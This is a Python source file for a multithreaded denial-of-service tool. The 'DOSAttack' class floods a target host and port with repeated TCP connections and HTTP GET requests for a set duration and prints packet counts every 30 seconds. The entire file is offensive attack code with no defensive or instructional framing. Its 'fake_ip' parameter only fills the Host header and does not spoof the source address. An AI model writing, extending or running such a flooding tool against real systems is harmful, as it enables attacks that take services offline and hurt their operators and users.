import socket
import threading
import time

class DOSAttack:
    def __init__(self, target, port, thread_count, fake_ip, duration):
        self.target = target
        self.port = port
        self.thread_count = thread_count
        self.fake_ip = fake_ip
        self.duration = duration
        self.start_time = time.time()
        self.packet_count = 0
        self.lock = threading.Lock()

    def attack(self):
        while time.time() - self.start_time < self.duration:
            try:
                with self.lock:
                    self.packet_count += 1  # Increment the packet count
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target, self.port))
                s.sendto(("GET /" + self.target + " HTTP/1.1\r\n").encode("ascii"), (self.target, self.port))
                s.sendto(("Host: " + self.fake_ip + "\r\n\r\n").encode('ascii'), (self.target, self.port))
                s.close()
            except Exception as e:
                with open("dos_errors.log", "a") as log_file:
                    log_file.write(f"Error: {e}\n")

    def start_attack(self):
        for i in range(self.thread_count):
            thread = threading.Thread(target=self.attack)
            thread.start()
        self.report_packets()

    def report_packets(self):
        start_reporting = time.time()
        while time.time() - start_reporting < self.duration:
            time.sleep(30)  # Wait for 30 seconds before reporting
            with self.lock:
                print(f"\nPackets sent in the last 30 seconds: {self.packet_count}")
                self.packet_count = 0  # Reset the counter after reporting
